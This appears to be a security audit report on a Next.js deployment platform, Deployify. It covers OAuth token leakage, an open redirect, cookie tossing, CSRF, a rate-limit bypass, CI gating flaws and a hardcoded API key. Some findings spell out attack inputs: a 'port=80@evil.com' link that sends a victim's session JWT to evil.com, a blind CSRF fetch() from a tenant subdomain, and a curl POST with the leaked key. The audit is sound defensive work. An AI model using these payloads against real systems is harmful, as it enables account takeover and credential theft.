Confirmed `escapeBashArg` (cloudbuild.ts:211) is applied to imageName and dockerBuildArgs at lines 289-293 and 316-320 but is NOT applied to `dockerfileContent` at line 233. Confirmed `safeRootDirectory` is used only for `workDir` (line 86) and never reaches getDockerfile. Read src/lib/dockerfiles.test.ts — it only tests benign values ('web', 'docs', 'api'), so no test covers this.

findings.title: User's GitHub OAuth access token is embedded verbatim in the Cloud Build step arguments and persisted in build history
findings.failure_scenario: A user deploys any project. Their GitHub OAuth access token (scoped to their repos) is written into the `steps[0].args` of the Build resource stored by Cloud Build in the shared platform GCP project. Any principal holding `cloudbuild.builds.get`/`roles/cloudbuild.builds.viewer` — every platform engineer, every CI robot, and anyone who obtains such a role, including via the injection in finding #1 — can run `gcloud builds list` then `gcloud builds describe <id>` and read the plaintext OAuth tokens of every customer who has ever deployed. Cloud Build retains build records long after the deploy completes, so revoking access later does not scrub them.
findings.impact: Cross-tenant credential theft: harvested GitHub OAuth tokens grant read/write access to each victim's private GitHub repositories, entirely outside Deployify. Secondarily, `repoFullName` and `commitSha` are interpolated into the same unquoted `bash -c` string with no escaping (contrast the deliberate `escapeBashArg` used at lines 289-293), so any path that lets those fields carry shell metacharacters is a second command-injection sink in the same line.
findings.checked_mitigations: Checked whether Cloud Build's secret facility is used: grepped cloudbuild.ts for `availableSecrets` and `secretEnv` — neither appears anywhere in the file; the only Secret Manager usage is `--set-secrets` for the deployed Cloud Run service (line 388), not for the build itself. Confirmed the token is not redacted before submission — `submitCloudBuild` (line 544) JSON-stringifies the config unchanged. Confirmed `escapeBashArg` exists at line 211 but is not applied to this step.

findings.title: No .dockerignore: `COPY . .` bakes live production secrets and the host's node_modules into the platform image build
findings.evidence:
Dockerfile:10-18:
FROM node:20-alpine AS builder
WORKDIR /app
COPY --from=deps /app/node_modules ./node_modules
COPY . .

ENV NEXT_TELEMETRY_DISABLED=1
ENV NODE_ENV=production

RUN npm run build

`ls -la` at repo root confirms there is no .dockerignore (the file does not exist), while `.env.local` (3505 bytes) does and holds live values for: GITHUB_CLIENT_SECRET, GITHUB_WEBHOOK_SECRET, FIREBASE_PRIVATE_KEY, JWT_SECRET, RAZORPAY_KEY_SECRET.
findings.failure_scenario: Two concrete failures from the same line. (1) Secrets: a developer or CI runs `docker build .` in a checkout. With no .dockerignore the build context includes `.env.local` and the full `.git` directory, and `COPY . .` writes both into the `builder` layer. Anyone who obtains that layer — via `docker build --target builder`, `docker save`, a BuildKit `--cache-to` registry export, or the `-builder` tagged images this codebase itself creates (src/lib/gcp/cloudbuild.ts:316-322 runs `docker build --target builder -t ${imageName}-builder`) — recovers JWT_SECRET, which is the HS256 signing key for every `deployify_session` cookie (src/lib/auth.ts:10 `new TextEncoder().encode(config.jwt.secret)`) AND, via src/lib/config.ts:60 `encryptionKey: process.env.ENCRYPTION_KEY || process.env.JWT_SECRET`, the AES-256-GCM key for every stored customer database credential. (2) Correctness: line 12 installs a linux/alpine `node_modules` from the `deps` stage, then line 13 immediately overlays it with whatever `node_modules` the host had — 640 entries on this macOS checkout. Native `.node` binaries built for darwin-arm64 replace the alpine ones, and `npm ci`'s pinned tree at line 8 is silently discarded.
findings.impact: Full session forgery and decryption of all stored tenant DB credentials if any builder layer or build cache ever escapes; plus non-reproducible, silently-corrupted images whose dependency tree is the build machine's rather than the lockfile's.
findings.checked_mitigations: Verified `.dockerignore` is absent at the repo root (and nowhere else: it does not appear in `git ls-files`). Verified `.env.local` is correctly gitignored (.gitignore:37 `.env*`) — so this is a Docker-context leak, not a git leak. Confirmed the final `runner` stage copies only `public`, `.next/standalone` and `.next/static` (Dockerfile:29-34) and that `.next/standalone` contains no `.env*` file locally, so the *final* image is clean — the exposure is the builder layer, the build cache, and the uploaded context.

findings.title: Next.js is pinned below the fixes for multiple Middleware/Proxy-bypass advisories, and src/proxy.ts is the sole edge auth gate
findings.failure_scenario: An unauthenticated attacker requests a `/dashboard/...` path using one of the published segment-prefetch or dynamic-route-parameter forms covered by GHSA advisories fixed in 16.2.5/16.2.6. Because the running Next.js is 16.2.3 and the manifest floor `^16.2.4` still resolves below every fix, `proxy()` is not invoked for that request, so the cookie check at line 156 never runs and the dashboard route renders without a session. Separately, `subdomain` at line 87/90 is derived purely from the client-supplied `Host` header and fed into `NextResponse.rewrite`, which is precisely the shape of the rewrite-SSRF advisory fixed in 16.2.11.
findings.impact: Unauthenticated reach into authenticated dashboard routes and SSRF from the platform's own edge. Also reachable in the same prod tree, from the same audit: mysql2 (high, 'Auth Plugin Downgrade to mysql_clear_password Leaks Plaintext Credentials' — directly relevant since src/lib connectors dial user-owned MySQL over the network), axios (high, multiple NO_PROXY/SSRF bypasses), and js-yaml (high, quadratic-complexity DoS). Prod-only totals: 55 vulnerabilities (4 critical, 22 high, 28 moderate, 1 low).
findings.checked_mitigations: Read src/proxy.ts end-to-end to confirm it is the enforcement point rather than decorative — lines 155-178 are the only cookie check before dashboard rendering, and the exported `config.matcher` at line 212 (`'/((?!favicon.ico|public/).*)'`) confirms it is meant to cover those paths. Verified the advisory ranges against the installed version programmatically rather than trusting the summary. Confirmed `npm audit --omit=dev` (production tree) rather than the dev tree.

findings.title: `MOCK_DB=true` disables the dashboard authentication gate in any NODE_ENV, including production
findings.failure_scenario: `MOCK_DB=true` is set in the Cloud Run service's environment — plausible because the same variable is threaded through ~20 production API handlers as a live runtime branch, not a test-only shim (e.g. src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:146, src/app/api/projects/[id]/storage/[storageId]/branch/route.ts:127/186/252/328, .../queries/route.ts:27, .../audit/route.ts:33, .../metrics/route.ts:29). With that single variable present, `proxy()` returns the response unchanged for every `/dashboard/*` and `/new` request, so an attacker with no cookie at all reaches the dashboard shell and every RSC payload it triggers. It also silently rewires those storage endpoints onto mock branches in production.
findings.impact: One misplaced environment variable in the Cloud Run service config converts the platform from authenticated to open, with no error, no log line, and no startup validation to catch it. The variable is not listed in env.example, so nothing documents that setting it is catastrophic.
findings.checked_mitigations: Grepped env.example and .github/workflows for MOCK_DB — zero hits, so it is not deliberately set in the shipped config today; the finding is that nothing prevents or detects it. Checked src/lib/config.ts:88-113 `validateConfig()` — it validates only GITHUB_CLIENT_ID/SECRET, GITHUB_WEBHOOK_SECRET, GCP_PROJECT_ID, JWT_SECRET, it never inspects MOCK_DB, and it only `console.warn`s (never throws), and its single caller is src/app/layout.tsx:10, which does not execute for API routes at all.

findings.title: No CI job runs the test suite or the linter; the only quality gate is a build step behind an author-name substring match, and the merge cron bypasses branch protection
findings.evidence:
.github/workflows/auto-merge-jules.yml:15 — the entire job, including the only build check in the repo, is gated on the PR author's login:
    if: github.event.pull_request.user.login == 'jules-google[bot]' || github.event.pull_request.user.login == 'jules[bot]' || contains(github.event.pull_request.user.login, 'jules') || github.event.pull_request.user.login == 'asangzz'

lines 30-35 are the only verification anywhere in CI:
      - name: Install dependencies
        run: npm install
      - name: Run build check
        run: npm run build
        continue-on-error: false

and lines 37-44 auto-approve then auto-merge it:
        run: gh pr review --approve "$PR_URL" || echo "..."
        run: gh pr merge --auto --squash "$PR_URL" || echo "..."

.github/workflows/cron-auto-merge.yml:38 merges with --admin, which bypasses branch protection:
            gh pr merge $pr --squash --admin || gh pr merge $pr --squash || echo "Failed to merge PR #$pr"
findings.failure_scenario: Two failures. (1) A PR authored by anyone whose login does not contain the substring 'jules' and is not 'asangzz' — i.e. any new contributor — gets no CI at all: `npm run lint` and `npm test` (159 tests, package.json:15-16) are not invoked by any of the three workflows. A change that breaks every test merges with a green (empty) check surface. (2) Conversely, an account registered as e.g. `julesX` or `notjules99` matches `contains(..., 'jules')` at line 15, so its PRs are auto-approved and queued for auto-merge; the scheduled job at cron-auto-merge.yml:29 then selects PRs where `reviewDecision == "APPROVED"` — the approval this workflow just manufactured — and merges them with `--admin`, explicitly overriding required-review and required-status-check protections on `main`.
findings.impact: The repository's stated safety posture ('Safety first' comment at cron-auto-merge.yml:27) is not enforced: untested code reaches main, and the review requirement can be satisfied by a bot approval keyed on an attacker-choosable username substring, then force-merged past branch protection. For a platform that builds and runs other people's code with a project-IAM-admin service account, an unreviewed merge is a supply-chain event.
findings.checked_mitigations: Read all three workflow files in .github/workflows end-to-end (auto-merge-jules.yml, cron-auto-merge.yml, sync-lockfile.yml). Grepped all of them for `npm test`, `npm run test`, `npm run lint`, and `eslint` — zero hits. Confirmed all three do declare explicit `permissions:` blocks and none uses `pull_request_target`, so the classic fork-secret-exfiltration pattern is genuinely absent; the defect is the gating logic and the `--admin` merge, not the trigger type. Noted that a fork PR's GITHUB_TOKEN is read-only, which limits (2) to same-repo branches, so it is scored medium rather than high.

findings.title: Two divergent lockfiles are committed and only one is kept in sync, so npm and pnpm builds resolve different Next.js versions
findings.evidence:
package.json:42 declares:
    "next": "^16.2.4",

package-lock.json resolves `node_modules/next` to 16.2.4 with root spec `^16.2.4`.

pnpm-lock.yaml:74-76 still records the OLD spec and an older resolution:
      next:
        specifier: ^16.2.3
        version: 16.2.3(@babel/core@7.29.0)(@opentelemetry/api@1.9.0)(...)

.github/workflows/sync-lockfile.yml:12-13 and :43-55 regenerate and commit only the npm lockfile:
    paths:
      - 'package.json'
...
          if git diff --quiet package-lock.json; then
...
          git add package-lock.json
          git commit -m "chore: sync package-lock.json [lockfile-sync]"
findings.failure_scenario: Both lockfiles sit at the repo root. The generated build logic picks by file precedence, not by intent — src/lib/dockerfiles.ts:340-343 and templates/Dockerfile.nextjs:13-18 both test `yarn.lock`, then `package-lock.json`, then `pnpm-lock.yaml`, so package-lock always wins and the pnpm lockfile is never exercised. Meanwhile sync-lockfile.yml fires on every package.json change and rewrites only package-lock.json, so pnpm-lock.yaml drifts monotonically and permanently: it is already stale by a full patch release of Next.js and records a specifier (`^16.2.3`) that no longer matches the manifest. Any developer or pipeline that runs `pnpm i --frozen-lockfile` gets ERR_PNPM_OUTDATED_LOCKFILE and a hard build failure; any that runs plain `pnpm i` silently installs Next 16.2.3 — which, per finding #4, is below even more advisory fix lines than 16.2.4.
findings.impact: Non-reproducible builds and a security-relevant version split: the dependency set you audit with npm is not the dependency set a pnpm-based build installs. The drift is structural, not a one-off, because the automation that maintains lockfiles was only ever taught about npm.
findings.checked_mitigations: Parsed both lockfiles programmatically rather than eyeballing timestamps, confirming the actual resolved versions differ (16.2.4 vs 16.2.3) and that the pnpm importer's recorded specifier no longer matches package.json. Checked whether a packageManager field or engines constraint forces one manager — package.json:5-7 declares only `"node": ">=20.0.0"`, no `packageManager` field, so nothing pins the choice. Confirmed the Dockerfile precedence order in both dockerfiles.ts and templates/Dockerfile.nextjs.

findings.title: Six production dependencies are never imported anywhere, and they contribute most of the critical/high advisories in the shipped tree
findings.evidence:
Declared in `dependencies` (package.json:19-56) but with zero import sites across src/ and scripts/:
    "@google-analytics/data": "^5.2.1",
    "cross-fetch": "^4.1.0",
    "crypto-js": "^4.2.0",
    "jsonwebtoken": "^9.0.3",
    "lighthouse": "^13.0.3",
    "next-auth": "^4.24.13",

`npm ls --omit=dev` shows what `lighthouse` alone drags in:
  deployify@0.2.0
  `-- lighthouse@13.0.3
    +-- puppeteer-core@24.40.0
    | `-- ws@8.20.0
    `-- ws@7.5.10

and `npm audit --omit=dev` attributes to these unused roots:
  DIRECT next-auth critical ["Auth.js: OAuth state, nonce, and PKCE check cookies are not bound to the provider that created them", "Auth.js: getToken() throws an uncaught exception on malformed Bearer authorization headers", ...]
  DIRECT lighthouse high ["@sentry/node","puppeteer-core"]
  ws 7.0.0 - 7.5.10 || 8.0.0 - 8.20.1  Severity: high  (uninitialized memory disclosure; memory-exhaustion DoS)
findings.failure_scenario: `npm ci` in the Dockerfile builder stage (Dockerfile:8) installs the full production tree — 595 prod packages — and executes every one of their install lifecycle scripts on the build machine, including puppeteer-core's and @sentry/node's, for code the application never calls. A malicious release or a compromised maintainer account on any of these six packages or their transitive tree executes on the platform's build host with no application-level reachability required, because the compromise happens at install time, not import time. Concretely: `next-auth` carries a critical Auth.js advisory in a project that authenticates with hand-rolled `jose` (src/lib/auth.ts:1) and never imports next-auth, so the risk is pure dead weight.
findings.impact: Materially inflated install-time attack surface and a permanently red `npm audit` that trains maintainers to ignore it — the critical and several high findings in the production tree come from packages the product does not use, which masks the genuinely reachable ones (next, mysql2, axios, js-yaml). Removing the six shrinks the prod tree and the advisory count without touching a line of application code. Secondary point relevant to crypto hygiene: `crypto-js` and `jsonwebtoken` sit in the manifest alongside `jose`, implying three JWT/crypto stacks where the code actually uses exactly one (jose in src/lib/auth.ts, node:crypto in src/lib/crypto.ts).
findings.checked_mitigations: Verified non-use two ways rather than assuming: an exact-form grep for `from '<pkg>'`, `require('<pkg>')` and subpath imports across src/ and scripts/, then a broader quoted-string grep for each package name. The only textual hit was the literal string 'lighthouse' in a user-agent bot list at src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:9 — unrelated to the npm package. Confirmed src/lib/performance/lighthouse.ts does NOT import the lighthouse package; it reads `data.lighthouseResult` from the PageSpeed Insights HTTP API. Confirmed pdfkit IS genuinely used (2 import sites) so it is excluded from this finding.

result.coverage_notes:
SWEPT END-TO-END: Dockerfile, templates/Dockerfile.nextjs, next.config.ts, tsconfig.json, eslint.config.mjs, package.json, package-lock.json, pnpm-lock.yaml, .gitignore, all three .github/workflows/*.yml, src/lib/dockerfiles.ts (all 6 generators, 436 lines), src/lib/gcp/cloudbuild.ts (765 lines), src/lib/config.ts, src/lib/crypto.ts (head), src/lib/auth.ts (head), src/proxy.ts (all 214 lines), src/app/api/projects/route.ts (POST validation), src/app/api/projects/[id]/route.ts (PATCH allowlist), src/app/api/projects/[id]/deploy/route.ts, plus every committed root-level script and artifact. Ran `npm audit --omit=dev` and `npm ls` for provenance.

EXPLICITLY CHECKED AND FOUND CLEAN — not reported:
- next.config.ts does NOT set `typescript.ignoreBuildErrors` or `eslint.ignoreDuringBuilds`; tsconfig has `strict: true`. The build genuinely fails on type errors. No finding.
- Both the platform Dockerfile and every generated user Dockerfile DO create and switch to a non-root USER (Dockerfile:26-36; dockerfiles.ts:73/131/188/245/297/362/433). No root-container finding.
- No workflow uses `pull_request_target`; all three declare explicit `permissions:` blocks; no third-party actions are used at all (only first-party actions/checkout@v4 and actions/setup-node@v4). The classic fork-secret-exfil pattern is absent.
- Build-time env var VALUES are correctly shell-escaped before `docker build` (cloudbuild.ts:211 `escapeBashArg`, applied at 289-293 and 316-320). The injection in finding #1 exists specifically because that escaping is not applied to the Dockerfile heredoc — I verified the difference rather than assuming.
- `.env.local` is correctly gitignored (.gitignore:37) and is NOT tracked by git — `git ls-files` confirms. The exposure in finding #3 is the Docker build context only.
- Tested a hypothesis and DISCARDED it: I suspected that because `validateConfig()` only warns (config.ts:104-111) and never throws, a missing JWT_SECRET would let `new TextEncoder().encode(undefined)` (auth.ts:10) produce a guessable HMAC key. Empirically `encode(undefined)` returns a 0-byte array and jose then throws `DataError: Zero-length key is not supported`, so the system fails closed. Not reported.
- Base images are unpinned mutable tags (`node:20-alpine`, `nginx:alpine`, `oven/bun:1-alpine`) with no digest. Real but on its own too thin for medium severity given everything above; folding it into finding #3's remediation is the right call.

COMMITTED JUNK — reviewed, no credentials found, below the severity bar so not filed as findings: `.deployify.json` (contains only `"token": "mock_session_token"` and `http://localhost:3000` — placeholder, not a real credential), `ui.md` (139KB) and `.agent/ui.md`, `plan.md`, `recommendation.md`, `ssl_toggle_full.png` / `ssl_toggle_verification.png`, `scripts/screenshots/*.png`, `scripts/videos/*.webm`, `test_ui.sh`, `verify_ssl_toggle.py`. `tsconfig.tsbuildinfo` (292KB) exists on disk but is correctly gitignored and untracked. One genuine but low-severity defect in this pile: `update_typography.sh:3` and `update_typography_2/3.sh` use `find src -type f -name "*.tsx" -o -name "*.ts" | xargs sed -i` — the `-o` binds looser than the implicit `-a -print`, so the `-type f` guard applies only to the first pattern, and `sed -i` without a backup suffix is GNU-only and fails on the macOS this repo is developed on. These are one-shot codemods that should be deleted, not fixed.

COULD NOT COVER: could not confirm the runtime jq shape of `gh pr list --json statusCheckRollup` (gh is unauthenticated in this environment), so I deliberately omitted a suspected claim that cron-auto-merge.yml:29's `.statusCheckRollup.state == "SUCCESS"` filter never matches because the field is an array — finding #6 rests only on what the workflow files plainly state. Also could not observe the actual Cloud Build service account's IAM policy; finding #1's impact is inferred from the `gcloud projects add-iam-policy-binding` and `gcloud secrets add-iam-policy-binding` calls the build itself issues at cloudbuild.ts:335-342, which the SA must be authorized for. No runtime GCP access, so nothing was validated against a live project.

findings.title: OAuth callback builds its CLI redirect from an unvalidated `port` query parameter, letting any attacker-supplied link exfiltrate the victim's session JWT to an arbitrary origin
findings.failure_scenario: Attacker sends a logged-in-to-GitHub victim the link `https://<app>/api/auth/github?cli=true&port=80@evil.com`. That handler mints a fresh valid `oauth_state`, stores `{cli:true, port:"80@evil.com"}` in `deployify_cli_context`, and redirects to GitHub. GitHub (already authorized for this OAuth app) silently redirects back to `/api/auth/callback`. State verification passes because the state was legitimately created in this same flow. The callback mints a 7-day session JWT for the victim and builds `http://localhost:80@evil.com/callback?token=<victim JWT>`. I verified in Node that `new URL('http://localhost:80@evil.com/callback?token=X')` parses with `host = evil.com`, `origin = http://evil.com` — `localhost:80` becomes userinfo. Next's `validateURL()` (node_modules/next/dist/server/web/utils.js:125) only does `String(new URL(url))`, so the Location header is emitted verbatim and the victim's browser navigates to evil.com carrying the session token in the query string.
findings.impact: Full, one-click account takeover of any Deployify user. The leaked value is the `deployify_session` JWT itself (7-day lifetime, contains the user's GitHub OAuth `accessToken` with `repo` scope per src/lib/auth.ts:15-38), so the attacker gets both the Deployify account and the victim's GitHub repo access. No XSS, no CSRF token bypass, and no user interaction beyond clicking a link is required.
findings.checked_mitigations: Grepped the whole repo for any numeric/format validation of `port` — there is none (`searchParams.get('port')` is written straight into the cookie and then into the URL template). Checked that the OAuth `state` cookie mitigates this: it does not, because the attacker's link starts the flow at `/api/auth/github`, which generates a matching state itself (src/app/api/auth/github/route.ts:13-23). Read Next's `validateURL` to confirm it does not reject userinfo-bearing URLs. Confirmed there is no allowlist of redirect hosts anywhere (`grep -rn 'callbackUrl|redirectTo|returnTo' src/` returns only src/app/join/page.tsx:41).

findings.title: Reverse proxy copies `Set-Cookie` from untrusted tenant apps onto `<slug>.<app-domain>`, and the session cookie has no `__Host-` prefix — enabling cookie tossing / session fixation on the platform itself
findings.failure_scenario: `set-cookie` is not in `skipHeaders`. I confirmed in Node that undici's `Headers.forEach` yields `set-cookie` entries (so `responseHeaders.set('set-cookie', ...)` forwards the tenant's last Set-Cookie verbatim). An attacker signs up, deploys any app, and gets `attacker.<app-domain>`. Their Cloud Run app answers with `Set-Cookie: deployify_session=<attacker's own valid JWT>; Domain=<app-domain>; Path=/dashboard`. The proxy forwards it, and the browser accepts it because `Domain` is a registrable-domain suffix of the requesting host. The victim clicks any link to `attacker.<app-domain>`; the cookie is now stored. When the victim later opens `<app-domain>/dashboard`, RFC 6265 orders longer-path cookies first, so `cookies().get('deployify_session')` in src/lib/auth.ts:90 returns the attacker's token instead of the victim's host-only cookie.
findings.impact: Session fixation: the victim silently operates inside the attacker's account. Every repository they import, environment variable they add, storage connector they attach (with its connection string), and payment method they register lands in the attacker's tenant — and `POST /api/projects` stores `githubToken: encrypt(session.accessToken)` (src/app/api/projects/route.ts), so the victim's GitHub OAuth token gets persisted on an attacker-owned project. The same passthrough also lets one tenant set a `Domain=<app-domain>` cookie that the proxy then forwards (request headers are relayed verbatim at lines 124-128, excluding only `host` and `connection`) into every other tenant's Cloud Run service.
findings.checked_mitigations: Grepped for `__Host-` / `__Secure-` prefixes and a `domain:` attribute on the session cookie — none (src/lib/auth.ts:117-123, src/app/api/auth/callback/route.ts:97-103). Checked `skipHeaders` for `set-cookie` — absent. Verified with a Node script that `Headers.forEach` iterates `set-cookie` (Node 20 spec behaviour) so the value survives the copy loop. Checked src/proxy.ts for any sanitising of proxied responses beyond `securityHeaders` (lines 12-18) — it only adds X-Content-Type-Options / X-Frame-Options / X-XSS-Protection / Referrer-Policy / Permissions-Policy.

findings.title: No CSRF token or Origin/Sec-Fetch-Site check on any of the 84 API route handlers, and SameSite=Lax provides no protection because attacker-controlled HTML is served from same-site sibling subdomains
findings.failure_scenario: `grep -rniE "origin|sec-fetch|referer" src/app/api src/proxy.ts src/middleware` returns zero validation hits — the only `csrf` string in the codebase is the OAuth `state` for the login flow. Because tenant apps are proxied at `<slug>.<app-domain>`, an attacker's deployed app is *same-site* with the dashboard, so SameSite=Lax does not block its subresource requests. Attacker page on `attacker.<app-domain>` runs `fetch('https://<app-domain>/api/projects', {method:'POST', credentials:'include', headers:{'Content-Type':'text/plain'}, body: JSON.stringify({repoFullName:'attacker/backdoor'})})`. `text/plain` keeps it a CORS *simple* request, so no preflight is sent and the request executes; `await request.json()` parses the body regardless of Content-Type. The response is unreadable (blind CSRF) but the write has already happened.
findings.impact: Any victim who visits any page on any tenant's Deployify-hosted site can have state changed in their own Deployify account: a project created from an attacker-controlled repository (which persists an encrypted copy of the victim's `repo`-scoped GitHub token and wires up a webhook-triggered build pipeline in the victim's GCP project), environment variables added via `POST /api/projects/[id]/env`, and any other cookie-authenticated POST. Because the malicious page is same-site, none of the browser's default CSRF mitigations apply.
findings.checked_mitigations: Grepped for `csrf`, `x-requested-with`, `sec-fetch-site`, `headers.get('origin')` and `referer` across src/ — only OAuth-state comments in src/app/api/auth/{github,callback}. Confirmed `checkProjectAccess` (src/middleware/rbac.ts) is authorization only, keyed on the session user, and does nothing about request provenance. Confirmed Next.js Server Action origin checking does not apply — the mutating surface is route handlers under src/app/api/**, not Server Actions. Confirmed the reserved-subdomain list in src/proxy.ts:96 does not prevent attackers from getting a subdomain, it only carves out platform names.

findings.title: Public shared-dashboard query executes the widget's saved query against a caller-supplied `storageId` instead of the widget's own connector
findings.failure_scenario: The code faithfully pins `query` to the widget's saved query but resolves `storageConfig` from the `storageId` path segment, never comparing it to `widgetData.storageId`. A project that publishes one widget (e.g. a harmless `SELECT * FROM users LIMIT 100` on a staging replica) can be attacked by anyone who knows any other connector id in the same project: `POST /api/projects/<projectId>/storage/<OTHER_STORAGE_ID>/query` with body `{"widgetId":"<the public widget id>"}` and no cookie at all. The saved query is then executed against the production database connector, whose credentials are fetched server-side at line 187 (`getSecretValue(storageConfig.connectionStringSecretId)`). Other public widget ids and their `storageId` values are themselves disclosed anonymously by `GET /api/projects/[id]/storage/dashboards/[dashboardId]` (src/app/api/projects/[id]/storage/dashboards/[dashboardId]/route.ts:41-56 returns the whole document, including `query` and `storageId`, whenever `isPublic` is true), so a project with two public widgets on two connectors can always be crossed.
findings.impact: Unauthenticated cross-connector data read. Results pass through `maskData`, but that is regex-only (src/lib/utils/masking.ts:6-12 covers just email/phone/credit-card/SSN/token patterns), so names, addresses, internal identifiers, hashes and all business data are returned in full — up to MAX_ROWS = 500 per call, repeatable. It also lets an anonymous caller drive connections and 25-second query load against connectors that were never shared.
findings.checked_mitigations: Read the whole authorization block (lines 30-80): the `widgetId` branch never calls `getSession()` or `checkProjectAccess`, and never validates `storageId === widgetData.storageId`. Checked the SQL read-only filter at lines 136-173 — it constrains the *verb*, not the *target database*, so it does not mitigate this. Checked `shouldMask = widgetId || access?.role === 'viewer'` (line 943) and read src/lib/utils/masking.ts to confirm masking is pattern-based and partial. Confirmed the feature is reachable: src/components/DataLab.tsx:1885-1888 builds the share URL and flips `isPublic: true`.

findings.title: Both rate limiters trust the first `X-Forwarded-For` entry, which is client-supplied, so the platform's only abuse control is bypassed with one header
findings.failure_scenario: Google's front ends append the real client IP to a caller-supplied `X-Forwarded-For` rather than replacing it, so `split(',')[0]` returns whatever the caller sent. An attacker issues each request with `X-Forwarded-For: <random IPv4>` and both limiters see a fresh identity every time: `checkRateLimit` at src/proxy.ts:23 creates a new bucket, and `rateLimitMap` in the collector never accumulates. The 30-requests-per-minute cap on `/api/auth/*` and the 20-per-minute cap on `/api/v1/collect` are both nullified. `x-real-ip` is only consulted when XFF is absent, so it is not a fallback check. The same spoofed value is what gets persisted as the visitor IP in `logEdgeEvent` (src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:17-30) and in the collector's `eventData.ip`.
findings.impact: No effective rate limiting anywhere on the platform. Unbounded unauthenticated requests to `/api/v1/collect`, each producing a Firestore document write plus a BigQuery streaming insert (lines 89-99) — direct cost amplification and analytics poisoning with attacker-chosen source IPs. The same bypass removes the only brute-force / enumeration control in front of the auth and webhook routes. The in-memory `Map` backing both limiters is also per-instance, so an autoscaled Cloud Run deployment multiplies the effective limit by the instance count even without spoofing.
findings.checked_mitigations: Grepped for any trusted-proxy / hop-count handling of X-Forwarded-For — there is none; both call sites take `[0]` unconditionally. Checked for Redis or any shared store behind the limiters: src/lib/security/index.ts:6 says `// Rate limiter storage (in-memory for development, use Redis in production)` and src/proxy.ts:21 uses a plain `new Map()`. Checked for a WAF/Cloud Armor config in the repo (next.config.ts, Dockerfile, .github/) — none present.

findings.title: No Content-Security-Policy is emitted anywhere, on the dashboard or on proxied tenant pages
findings.failure_scenario: `grep -rn "Content-Security-Policy\|contentSecurityPolicy\|frame-ancestors" src/ next.config.ts` returns nothing. Consequences that are concrete rather than theoretical: (1) the dashboard loads a third-party script from `https://checkout.razorpay.com/v1/checkout.js` (src/app/billing/page.tsx:228) with no `script-src` restriction and no SRI, so a compromise of that CDN yields arbitrary JS in a page that renders decrypted environment variables and database result sets; (2) the reverse proxy rewrites every tenant response and re-serves it from `<slug>.<app-domain>` (src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:196-203) with no CSP and with the tenant's own `x-frame-options` explicitly stripped at line 170, so a stored XSS inside any customer's app runs unconstrained on a subdomain that is same-site with the dashboard — which is exactly the position needed to mount the cookie-tossing and CSRF attacks described in the other findings; (3) there is no `frame-ancestors` fallback, so framing protection rests entirely on the legacy `X-Frame-Options` header.
findings.impact: Removes the last containment layer for every script-injection path in the product. Because the platform intentionally hosts customer-controlled HTML on subdomains of its own origin, script execution on `*.<app-domain>` is not a hypothetical — it is a supported product feature — and there is no policy limiting what that script may connect to, load, or frame.
findings.checked_mitigations: Grepped `Content-Security-Policy`, `contentSecurityPolicy`, `frame-ancestors`, `Strict-Transport` across src/, next.config.ts, Dockerfile and .github/ — zero hits. Confirmed next.config.ts's `headers()` returns only X-DNS-Prefetch-Control and that its comment `// Security headers are handled by middleware` points at src/proxy.ts, which has no CSP either. Confirmed the app has no `dangerouslySetInnerHTML` with dynamic data (the single occurrence, src/app/dashboard/layout.tsx:27, is a static string) — so this is reported as a missing containment control, not as an exploitable injection on its own.

findings.title: Hardcoded API key `deployify-dashboard-internal` bypasses API-key verification on the public analytics ingest endpoint
findings.failure_scenario: The literal string is a shared secret compiled into the route and is trivially discoverable — any visitor to a proxied tenant site can read the injected `<script src="/deployify-insights.js" data-api-key="...">` tag pattern, and the endpoint accepts unauthenticated cross-origin POSTs by design. Anyone can `curl -X POST https://<app-domain>/api/v1/collect -d '{"apiKey":"deployify-dashboard-internal","type":"pageview","path":"/anything"}'` and have the event stored under `projectId: 'deployify-dashboard'`. Combined with the X-Forwarded-For rate-limit bypass in the previous finding, the volume is unbounded.
findings.impact: Anonymous write access to the platform operator's own analytics dataset: forged pageviews and Web-Vitals metrics land in Firestore (`Collections.ANALYTICS_EVENTS`) and are dual-written to BigQuery (lines 92-99) with attacker-chosen `path`, `referrer`, `userAgent` and (spoofable) `ip`. That corrupts the operator's own product metrics and creates a metered Firestore-write + BigQuery-streaming-insert cost per request with no authentication.
findings.checked_mitigations: Traced `getProjectByApiKey` (src/lib/db.ts:696) to confirm real keys are looked up in Firestore and that the `isInternal` branch short-circuits that lookup entirely. Checked whether the constant is loaded from configuration — it is not; it is an inline literal, and `grep -rn 'deployify-dashboard-internal'` shows no env-var indirection. Verified the rate limiter in front of it is bypassable (see the X-Forwarded-For finding), so the 20/min cap is not a mitigation. Noted that the `Access-Control-Allow-Origin: '*'` is on the OPTIONS response only and no credentials are involved, so the wildcard CORS itself is not the defect — the unauthenticated magic key is.

result.coverage_notes:
Swept for the assigned dimension and read every hit end-to-end.

XSS sinks — clean, and I am explicitly reporting no XSS finding rather than inventing one. `grep -rn "dangerouslySetInnerHTML|innerHTML|outerHTML|insertAdjacentHTML|eval\(|new Function|document.write" src/ public/` yields exactly one hit: src/app/dashboard/layout.tsx:27, a static `window.location.href = '/login';` string with no interpolation. src/components/ui/query-editor.tsx:96-99 builds DOM nodes with `textContent`, not HTML. All ~69 components render values as JSX children (React-escaped). public/deployify-insights.js never touches the DOM — it only reads `document.currentScript` attributes and posts JSON.

Dynamic hrefs / tabnabbing — checked all 9 `href={...}` sites. `project.repoUrl` and `deployment.url` come from GitHub/Cloud Run; `productionUrl` is written only by src/lib/deployment.ts:137 from the Cloud Run response, not by user input; `href={`https://${domain.domain}`}` has a hardcoded scheme prefix. The six `target="_blank"` sites lack `rel="noopener"`, but every current browser applies noopener implicitly to `target="_blank"` — I dropped this as not genuinely exploitable.

CSP / clickjacking — reported. Note that `X-Frame-Options: DENY` from src/proxy.ts:58-59 does reach the client on rewrites (middleware response headers are merged into the rewritten response), so I did *not* report the `x-frame-options` strip at proxy route line 170 as a clickjacking hole for the dashboard; its real significance is that it silently removes a framing defence the *tenant* set for their own site, which I folded into the CSP finding.

CORS — the only `Access-Control-*` headers in the codebase are the three on the OPTIONS handler of /api/v1/collect. No credentialed endpoint sets permissive CORS, and no route reflects an Origin. The wildcard there is appropriate for an anonymous beacon; the actual defect is the hardcoded key, reported separately.

